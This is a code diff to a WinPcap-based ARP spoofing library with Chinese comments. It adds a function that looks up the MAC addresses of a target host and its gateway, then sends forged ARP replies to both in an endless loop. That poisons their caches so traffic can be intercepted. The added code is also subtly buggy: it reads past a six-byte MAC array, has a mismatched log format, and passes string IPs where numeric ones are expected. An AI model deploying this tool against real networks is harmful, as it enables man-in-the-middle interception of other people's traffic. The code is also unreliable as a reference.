@@ -1,17 +1,22 @@
 #include "stdAfx.h"
 #include <stdio.h> 
 #include "ArpSpoofLib.h" 
+#include <Iphlpapi.h>
 
 #pragma comment(lib, "wpcap.lib")
 #pragma comment(lib, "packet.lib")
+#pragma comment(lib, "Iphlpapi.lib")
+
 
 #ifdef WIN32
 #pragma comment(lib, "ws2_32.lib")
 #endif
 
-#define LOG_DEBUG printf
-#define LOG_ERROR printf
-#define LOG_INFO printf
+
+#define LOG_DEBUG TRACE
+#define LOG_ERROR TRACE
+#define LOG_INFO TRACE
+
 
 /* From tcptraceroute, convert a numeric IP address to a string */
 #define IPTOSBUFFERS	12
@@ -348,6 +353,18 @@ int BuildArpReply(
 	return nRet;
 }
 
+/*!
+\brief   建立arp应答包
+\param   struct arp_packet * pPacket：包指针
+\param   unsigned char * pSrcMac    ：源MAC地址，6字节MAC地址数组
+\param   unsigned char * pDstMac    ：目的MAC地址，6字节MAC地址数组
+\param   unsigned long lSrcIp       ：源IP。4字节IP地址
+\param   unsigned long lDstIp       ：目的IP
+\return  类型为 int 。
+\version 1.0
+\author  康  林
+\date    2013/4/7 13:14:06
+*/
 int BuildArpReply(
     /*[in/out]*/struct arp_packet * pPacket,
 	/*[in]*/unsigned char * pSrcMac,
@@ -379,13 +396,13 @@ int ArpSpoof(
 		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
 		if(pcap_sendpacket(Handler, (const u_char * )&packet, 60) == -1)
 		{
-			fprintf(stderr, "pcap_sendpacket send arp spoof to host error.\n");
+			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
 		}
 
 		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
 		if(pcap_sendpacket(Handler, (const u_char * )&packet, 60) == -1)
 		{
-			fprintf(stderr, "pcap_sendpacket send arp spoof to gateway error.\n");
+			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
 		}
 		Sleep(nInterval);
 	} // 结束 while(1)
@@ -426,18 +443,133 @@ int ArpSpoof(
 		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
 		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
 		{
-			fprintf(stderr, "pcap_sendpacket send arp spoof to host error.\n");
+			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
 		}
 
 		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
 		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
 		{
-			fprintf(stderr, "pcap_sendpacket send arp spoof to gateway error.\n");
+			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
 		}
 		Sleep(nInterval);
 	} // 结束 while(1)
 
 	pcap_close(pHandler); 
+	return nRet;
+}
+
+int ArpSpoof(
+			 char * pszInterfaceName, char * pszGatewayIp,
+			 char * pszHostIp, int nInterval /*ms*/
+			 )
+{
+    int nRet = 0;
+	struct arp_packet packet;
+	pcap_t * pHandler;
+	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
+	unsigned char gatewayMac[6] = {0};
+	unsigned char hostMac[6] = {0};
+	unsigned char localMac[6] = {0};
+
+	GetSelfMac(pszInterfaceName, localMac);
+	GetMac(pszGatewayIp, gatewayMac);
+	GetMac(pszHostIp, hostMac);
+
+	/* 打开网卡 */ 
+	if((pHandler = pcap_open(pszInterfaceName, // name of the device 
+		65536, // portion of the packet to capture 
+		0, //open flag 
+		1000, // read timeout 
+		NULL, // authentication on the remote machine 
+		errbuf // error buffer 
+		) ) == NULL) 
+	{ 
+		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
+			pszInterfaceName); 
+		/* Free the device list */ 
+		return -1; 
+	} 
+
+	//向网关和主机分别定时发送欺骗包
+	while(1)
+	{
+		BuildArpReply(&packet, localMac, hostMac, pszGatewayIp, pszHostIp);
+		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+		{
+			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
+		}
+
+		BuildArpReply(&packet, localMac, gatewayMac, pszHostIp, pszGatewayIp);
+		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+		{
+			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
+		}
+		Sleep(nInterval);
+	} // 结束 while(1)
+
+	pcap_close(pHandler); 
+	return nRet;
+}
+
+int GetMac( /*[in]*/char * pszIp, /*[out]*/unsigned char * Mac)
+{
+	int nRet = 0;
+	bool bDelete = false;
+	MIB_IPNETTABLE table;
+	PMIB_IPNETTABLE pIpNetTable = &table;
+	ULONG nSize = sizeof(MIB_IPNETTABLE);
+	DWORD dwIp = inet_addr(pszIp);
+	memset(pIpNetTable, 0, nSize);
+
+	nRet = GetIpNetTable(pIpNetTable, &nSize, false);
+	if(NO_ERROR != nRet)
+	{
+		if(ERROR_INSUFFICIENT_BUFFER == nRet)
+		{
+			pIpNetTable = (PMIB_IPNETTABLE)new char[nSize];
+			if(NULL == pIpNetTable)
+			{
+				return - 1;
+			}// 结束 if(NULL == pIpNetTable)
+			bDelete = true;
+		}
+		else
+		{
+			return nRet;
+		}// 结束 if(ERROR_INSUFFICIENT_BUFFER == nRet)
+	} // 结束 if(NO_ERROR != nRet)
+
+	memset(pIpNetTable, 0, nSize);
+	nRet = GetIpNetTable(pIpNetTable, &nSize, false);
+	if(NO_ERROR != nRet)
+	{
+		LOG_ERROR("GetIpNetTable error.nRet:\n", nRet);
+		if(bDelete)
+			delete []pIpNetTable;
+		return nRet;
+	}// 结束 (pIpNetTable, &nSize, false)
+
+	PMIB_IPNETTABLE * p;
+	for(int i = 0; i < pIpNetTable->dwNumEntries; i++)
+	{
+		LOG_DEBUG("IP:%s; MAC:%2X-%2X-%2X-%2X-%2X-%2X\n",
+			iptos(pIpNetTable->table[i].dwAddr),
+			Mac[0], Mac[1], Mac[2], Mac[3], Mac[4], Mac[5], Mac[6]);
+		if(dwIp == pIpNetTable->table[i].dwAddr)
+		{
+			memcpy(Mac, pIpNetTable->table[i].bPhysAddr, pIpNetTable->table[i].dwPhysAddrLen);
+			if(bDelete)
+			{
+				delete []pIpNetTable;
+			}
+			return 0;
+		} // 结束 if(dwIp == pIpNetTable->table[i].dwAddr)
+	} // 结束 for(int i = 0; i < pIpNetTable->dwNumEntries; i++)
+
+	
+	if(bDelete)
+		delete []pIpNetTable;
+
 	return nRet;
 }
 
